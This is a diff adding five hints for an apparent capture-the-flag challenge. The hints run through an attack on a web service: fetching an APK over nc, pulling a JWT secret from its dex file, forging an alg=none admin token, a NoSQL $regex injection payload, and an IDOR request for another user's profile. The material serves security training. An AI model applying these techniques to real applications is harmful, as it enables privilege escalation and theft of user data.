@@ -1,0 +1,5 @@
+[Hint 1] Use `echo "pull /data/app/base.apk" | nc 127.0.0.1 8702 > base.apk` to download the APK.
+[Hint 2] Run `unzip -p base.apk classes.dex | strings` to find the JWT secret and API URL.
+[Hint 3] After obtaining the JWT secret, modify the token (alg=none) and set role=admin.
+[Hint 4] In the admin user search, try: {"secret":{"$regex":".*"}} to find users with non-empty secrets.
+[Hint 5] Or use /api/profile?user_id=3 to directly view flagholder's profile.
